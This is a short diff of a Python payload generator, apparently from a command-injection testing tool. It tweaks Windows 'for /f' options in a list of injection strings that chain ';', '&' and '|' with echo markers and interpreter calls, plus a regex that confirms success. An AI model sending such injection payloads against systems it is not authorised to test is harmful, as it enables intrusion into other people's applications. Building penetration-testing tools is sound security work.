@@ -74,8 +74,8 @@ def basic_payload_generator():
   settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                               "%26echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                               "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2,
-                                              "|echo " + marker1 + "%26for /f \"tokens=*\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2 +
-                                              "%26echo " + marker1 + "%26for /f \"tokens=*\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2
+                                              "|echo " + marker1 + "%26for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2 +
+                                              "%26echo " + marker1 + "%26for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2
                                               ]
   settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(str(rand_a + rand_b)) + r"\s*" + re.escape(marker2)
 
